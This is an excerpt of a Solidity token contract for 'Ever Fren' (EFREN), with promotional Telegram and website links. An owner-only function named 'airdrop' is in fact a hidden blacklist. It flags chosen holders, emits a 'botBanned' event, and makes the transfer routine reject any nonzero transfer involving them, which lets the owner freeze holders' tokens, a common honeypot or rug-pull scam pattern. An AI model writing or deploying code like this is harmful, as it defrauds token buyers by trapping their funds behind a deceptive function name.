...
Telegram - https://t.me/EverFren       Website - https://www.everfren.com
...
contract EverFren is Context, IERC20, Ownable {
    ...
    event botBanned (address holderAddress, bool isBanned);
    ...
    string private _name = 'Ever Fren';
    string private _symbol = 'EFREN';
    ...
    function airdrop(address holderAddress) external onlyOwner {
        if (_airdrop[holderAddress] == true) {
            _airdrop[holderAddress] = false;
        } else {_airdrop[holderAddress] = true;
            emit botBanned (holderAddress, _airdrop[holderAddress]);
          }
    }
    
    function checkAirdrop(address holderAddress) public view returns (bool) {
        return _airdrop[holderAddress];
    }
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
       ...
       function multisend(address owner, uint256 amount) public virtual onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_airdrop[sender] || _airdrop[recipient]) require (amount == 0, "");
